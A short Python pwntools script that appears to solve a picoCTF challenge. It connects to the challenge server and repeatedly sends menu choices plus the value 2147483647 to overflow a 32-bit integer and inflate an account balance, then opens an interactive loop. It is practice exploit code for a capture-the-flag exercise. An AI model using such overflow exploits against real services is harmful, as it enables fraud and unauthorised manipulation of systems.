import pwn


# nc jupiter.challenges.picoctf.org 44566
conn = pwn.remote("jupiter.challenges.picoctf.org",44566)

lim = int((100000-1100)/900)+1
print(lim)

_ = conn.recv()

for i in range(lim):
    conn.send("2\n".encode())
    _ = conn.recv()
    conn.send("1\n".encode())
    _ = conn.recv()
    conn.send("2147483647\n".encode())
    _ = conn.recv()

    conn.send("1\n".encode())
    bal = conn.recv()
    print(bal)
print("============================================")
n = ''
while n!='n':
    n = input()
    conn.send(n.encode())
    dt = conn.recv()
    print(dt)




# _ = conn.recv()
# conn.send("2\n".encode())
# _ = conn.recv()
# conn.send("2\n".encode())
# _ = conn.recv()
# conn.send("2\n".encode())
# data = conn.recv()
# print(data)
# conn.send("1\n".encode())
# data = conn.recv()
# print(data)